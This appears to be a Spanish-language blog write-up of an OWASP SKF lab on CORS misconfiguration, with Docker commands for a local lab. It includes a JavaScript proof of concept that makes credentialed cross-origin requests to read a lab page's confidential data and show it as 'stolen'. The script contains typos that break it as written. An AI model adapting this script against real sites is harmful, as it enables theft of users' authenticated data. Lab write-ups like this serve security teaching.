---
title: "Intercambio de recursos de origen cruzado (CORS)"
author: Tuch0
date: 2023-09-17
categories: 
  - Vectores-de-Ataque
tags: 
  - CORS
image:
  path: ../../assets/Miniaturas/VectoresDeAtaque/cors.jpeg
  width: 800
  height: 500
---

#### Desplegamos el laboratorio

```bash
# Creamos la imagen
docker pull blabla1337/owasp-skf-lab:cors

# Desplegamos el contenedor
docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:cors
```

### ¿Que és?

> **CORS (Intercambio de recursos de origen cruzado)** El intercambio de recursos de origen cruzado o CORS es un mecanismo que permite que se puedan solicitar recursos restringidos en una página web desde un dominio diferente del dominio que sirvió el primer recurso.
{: .prompt-info }

> Supongamos que tenemos una aplicación web en el dominio “**example.com**” que utiliza una API web en el dominio “**api.example.com**” para recuperar datos. Si la aplicación web está correctamente configurada para CORS, solo permitirá solicitudes de origen cruzado desde el dominio “**example.com**” a la API en el dominio “**api.example.com**“. Si se realiza una solicitud desde un dominio diferente, como “**attacker.com**“, la solicitud será bloqueada por el navegador web.
{: .prompt-info }

### Escenario

![](../../assets/VectoresDeAtaque/Intercambio-de-recursos-de-origen-cruzado-(CORS)/1.jpg)

> Donde pone "Access-Control-Allow-Origin: *" , quiere decir que cualquiera puede cargar recursos de la web, **esto permite crear nosotros nuestro propio servidor y volvarnos los archivos de la web víctima**
{: .prompt-info }

### Explotación

```php
<script>
	var req = new XMLHttpRequest()
	req.onload = reqListener;
	req.open('GET', 'http://localhost:5000/confidential', true);
	req.withCredentials = rue;
	req.send();

	funciton reqListener() {
		document.getElementById("stoleInfo").innerHTML = req.responseText;
	}
</script>

<br>
<center><h1>Has sido hackeado , esta es la informaci&oacute;n que te he robado:</h1></center>
<p id="stoleInfo"></p>
```

![](../../assets/VectoresDeAtaque/Intercambio-de-recursos-de-origen-cruzado-(CORS)/2.jpg)

> Como vemos está mal configurado ya que nos permite que el origen sea de donde queramos, a si que vamos a montarnos un servidor malicioso
{: .prompt-info }

![](../../assets/VectoresDeAtaque/Intercambio-de-recursos-de-origen-cruzado-(CORS)/3.jpg)

![](../../assets/VectoresDeAtaque/Intercambio-de-recursos-de-origen-cruzado-(CORS)/4.jpg)

![](../../assets/VectoresDeAtaque/Intercambio-de-recursos-de-origen-cruzado-(CORS)/5.jpg)

![](../../assets/VectoresDeAtaque/Intercambio-de-recursos-de-origen-cruzado-(CORS)/6.jpg)

> Como vemos por detrás estaria pasando todo esto , esto , por lo tanto como nos permite tener accesso desde mi localhost, nos podemos descargar el recurso , **porque estoy "Autorizado"**
{: .prompt-info }

### Como sanitizar el código

![](../../assets/VectoresDeAtaque/Intercambio-de-recursos-de-origen-cruzado-(CORS)/7.jpg)

![](../../assets/VectoresDeAtaque/Intercambio-de-recursos-de-origen-cruzado-(CORS)/8.jpg)
